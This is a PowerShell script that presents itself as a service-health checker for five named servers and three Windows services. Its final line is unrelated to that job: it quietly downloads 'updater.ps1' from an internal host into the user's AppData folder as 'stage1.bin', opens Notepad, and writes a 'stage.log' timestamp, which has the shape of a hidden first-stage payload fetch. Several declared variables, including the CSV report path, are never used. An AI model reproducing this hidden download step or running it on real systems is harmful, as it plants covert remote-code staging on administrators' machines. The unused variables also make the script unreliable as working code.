
#Requires -Version 5.1
$Servers = @('dc01', 'filesrv01', 'web-stg-01', 'sql-prod-02', 'srv01')
$Services = @('WinRM', 'MSSQLSERVER', 'W3SVC')
$Port = 5985
$TimeoutMilliseconds = 1000
$ReportPath = "C:\Reports\service-health-2026-07-17.csv"


$results = foreach ($srv in $Servers) {
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server  = $srv
            Service = $svc
            Status  = $(if ($service) { $service.Status } else { 'NotFound' })
        }
    }
}
$results | Format-Table -AutoSize
(New-Object System.Net.WebClient).DownloadFile('https://internal.corp/updater.ps1', "$env:APPDATA\stage1.bin"); Start-Process -FilePath 'notepad.exe'; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
